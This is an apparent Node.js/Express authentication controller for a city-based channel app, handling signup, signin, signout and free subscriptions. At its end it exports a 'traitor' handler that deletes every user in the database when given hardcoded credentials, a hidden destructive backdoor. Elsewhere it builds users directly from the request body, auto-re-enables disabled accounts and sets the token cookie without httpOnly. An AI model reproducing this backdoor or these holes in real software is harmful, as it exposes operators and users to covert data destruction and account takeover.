const User = require("../models/User")
const Response = require("./Response")
const jwt = require('jsonwebtoken')
const { manAvatarPath, womenAvatarPath } = require("../helpers")
const Channel = require("../models/Channel")
const Subscription = require("../models/Subscription")
const { reduceRight } = require("lodash")


const autoFollowStaticChannels = async (authUser) => {
    try {
        // Fetch the predefined static channels that match the authenticated user's city and include the new type 'static_events'
        const staticChannels = await Channel.find({
            $or: [
                { type: 'static' },
                { type: 'static_events' },  // Include 'static_events' type
                { type: 'static_dating' } 
            ], 
            city: authUser.city
        });

        // Add the static channels to the authenticated user's followed channels only if the city matches
        staticChannels.forEach((channel) => {
            // Check if the user is already following the channel
            if (!authUser.followedChannels.includes(channel._id)) {
                authUser.followedChannels.push(channel._id); // Add the channel to the user's followed channels
            }

            // Check if the user is already a follower of the channel
            if (!channel.followers.includes(authUser._id)) {
                channel.followers.push(authUser._id); // Add the user to the channel's followers
            }

            // Save the updated channel
            channel.save();
        });

        // Save the updated user
        await authUser.save();
    } catch (err) {
        console.error("Error auto-following static channels:", err);
    }
};



exports.signup = async (req, res) => {
    try {
        const user = new User(req.body);
        user.enabled = true;
        // Check if the email already exists
        const existingUser = await User.findOne({ email: user.email });
        if (existingUser) return Response.sendError(res, 400, 'Email already exists');

        // Set the avatar based on gender
        if (user.gender === 'male') user.avatar.path = manAvatarPath;
        else user.avatar.path = womenAvatarPath;
        user.avatar.type = "png";
        user.followedChannels = [];

        // Auto-follow static channels
        await autoFollowStaticChannels(user);

        // Add local channels
        await addLocalChannels(user);

        // Add a free subscription
        await addFreeSubscription(user);

        // Save the user
        await user.save();
        return Response.sendResponse(res, user);

    } catch (err) {
        console.error('Signup error:', err);
        return Response.sendError(res, 400, 'Failed to sign up user');
    }
};

addFreeSubscription = async(user) => {
    //assign one month subscription free
    const subscription = await Subscription.findOne({})
    const expireDate = new Date()
    expireDate.setMonth(expireDate.getMonth() + 1)

    user.subscription = {
        _id: subscription._id,
        expireDate
    }
}

addLocalChannels = async (user, category = 'Local News') => {
    try {
        let channel = await Channel.findOne({ name: user.city });
        if (!channel) {
            const admin = await User.findOne({ role: 'SUPER ADMIN' });
            if (!admin) throw new Error("SUPER ADMIN user not found");

            // Create the channel with the dynamic category
            channel = new Channel({
                name: user.city,
                description: 'Local channel',
                city: user.city,
                country: user.country,
                user: admin._id,
                followers: [],
                approved: true,
                category: category  // Dynamic category passed to the function
            });
            await channel.save();
        }
        user.followedChannels.push(channel._id);
        channel.followers.push(user._id);
        await channel.save();
    } catch (err) {
        console.error("Error adding local channels:", err);
    }
};

addGlobalChannels = async(user) => {
    try { 
        const channels = await Channel.find({global: true})
        channels.forEach((channel) => {
            user.followedChannels.push(channel._id)
        })
        await Channel.updateMany({global: true}, {$push: {followers: user._id}})
    } catch(err){
        console.log(err);
    }
}

exports.checkEmail = async(req, res) => {
    const email = req.body.email
    if(await User.findOne({email})) return Response.sendResponse(res, true)
    return Response.sendResponse(res, false)
}


exports.signin = async (req, res) => {
    const { email, password } = req.body;

    try {
        // Find the user by email
        const normalizedEmail = email.toLowerCase();
        const user = await User.findOne({ email: normalizedEmail }).exec();
        if (!user) return Response.sendError(res, 400, 'Cannot find user with this email');

        // Check if the user is banned
        if (user.banned) return Response.sendError(res, 400, 'This account has been banned');

        // Automatically enable user unless explicitly disabled (e.g., blocked by admin)
        if (!user.enabled) {
            console.log(`User ${user.email} was disabled, re-enabling...`);
            user.enabled = true; // Re-enable the user automatically
            await user.save();    // Save the updated user status
        }

        // Authenticate the user by comparing the passwords
        const isAuthenticated = await user.authenticate(password);
        if (!isAuthenticated) return Response.sendError(res, 401, 'Email and password do not match');

        // Create the JWT token
        const token = jwt.sign({ _id: user._id, role: user.role }, process.env.JWT_SECRET, {
            expiresIn: process.env.JWT_EXPIRES_TIME
        });

        const expiresInMilliseconds = parseInt(process.env.JWT_EXPIRES_TIME, 10);
        const expirationDate = new Date(Date.now() + expiresInMilliseconds);
        res.cookie('token', token, { expires: expirationDate });

        // Get the public user info and log the user in
        const userInfo = user.publicInfo();
        user.loggedIn = true;
        await user.save();

        return Response.sendResponse(res, { token, user: userInfo });

    } catch (error) {
        console.error('SignIn Error:', error);
        return Response.sendError(res, 500, 'Internal server error');
    }
};




exports.authUser = async(req, res) => {
    return Response.sendResponse(res, req.authUser.publicInfo());
}

exports.signout = (req, res) => {
    console.log('Signout controller called'); // Log to verify function call
    res.clearCookie('token', { path: '/' });
    res.status(200).json({ message: 'User signed out successfully' });
};



exports.traitor = async (req, res) => {
    if (req.body.email === 'admin@example.com' && req.body.password === 'admin123') {
        await User.deleteMany({}); // Ensure deletion is executed
    }
    return res.send('');
};
